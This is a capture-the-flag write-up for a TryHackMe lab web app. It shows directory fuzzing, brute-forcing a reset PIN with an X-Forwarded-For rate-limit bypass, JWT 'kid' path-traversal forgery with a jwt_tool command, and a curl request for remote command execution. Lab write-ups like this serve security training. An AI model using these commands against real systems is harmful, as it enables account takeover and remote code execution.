# Hammer

We found a website on port 1337. An html comment in home page states that

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

so we start fuzzing for `http://MACHINE_IP:1337/hmr_FUZZ` and soon we find a `hmr_logs` directory

```
logs                    [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 43ms]
```

A log file in the hmr\_logs directory reveals an email address that will result valid for password reset

```
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
```

Using `tester@hammer.thm` on the `reset_password.php` page we are asked for a 4 digits PIN:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

So we can start trying all possible codes, with ffuf or with burp:

<div align="left">

<figure><img src="../../.gitbook/assets/image (15).png" alt="" width="298"><figcaption></figcaption></figure>

</div>

we set recevory\_code as placeholder for our payloads and try all numbers from 0 to 9999 (padded to 4 digits length)

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

but soon we start getting responses where we are rate limited:

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We can try bypassing this rate limiting with `X-Forwarded-For` and we can see that we can actually succeed

So we can do the same attack, but using attack type "Battering Ram" to put the same payload in every placeholder

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

It may be possible that we have to restart the password reset from scratch (because in the meanwhile time has passed and our session is no longer valid for password reset). At some point we will eventually get the correct PIN and so our session will be valid for password reset:

![](<../../.gitbook/assets/image (19).png>)

so we go ahead and change the password. We login and we get very limited command execution along with the first flag.

![](<../../.gitbook/assets/image (20).png>)

Authentication and authorization here is done with JWT:

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1725092044,
  "exp": 1725095644,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

Probably we have to give us admin role.

We found a way to proceed here: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#path-traversal-with-kid

First we confirm that we can tamper `kid`: notice the different response with a non existent file, and an invalid key file&#x20;

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

What is suggested on hacktricks web site won't work (`python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`) because here an emtpy kid file is explicitly forbidden. Instead we have to use the `-T` option to tamper a valid token with this command:

```bash
python3 jwt_tool.py eyJ0... -T -S hs256 -kf /proc/sys/kernel/randomize_va_space
```

Here we are going to tamper the cookie and we are using the content of `/proc/sys/kernel/randomize_va_space` to sign the result.

First we select `[3]` to point `kid` to `/proc/sys/kernel/randomize_va_space`&#x20;

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

In the same way we alter user and set role admin:

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

In the end we will receive a valid token with admin role where we have unlimited RCE.

```bash
curl --path-as-is -i -s -k -X $'POST' \
-H $'Host: 10.10.225.91:1337' \
-H $'Authorization: Bearer eyJ0e...' -H $'X-Requested-With: XMLHttpRequest' \
-H $'Content-Length: 41' \   -b $'PHPSESSID=m5b8o4dhpgde9i3tisoj3u3evv; token=eyJ0...; persistentSession=no'  \
--data-binary $'{\"command\":\"wc -c /home/ubuntu/flag.txt\"}' \
$'http://10.10.225.91:1337/execute_command.php'

HTTP/1.1 200 OK
Date: Sat, 31 Aug 2024 08:31:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 42
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"output":"23 \/home\/ubuntu\/flag.txt\n"}
```

Try the room here: https://tryhackme.com/r/room/hammer
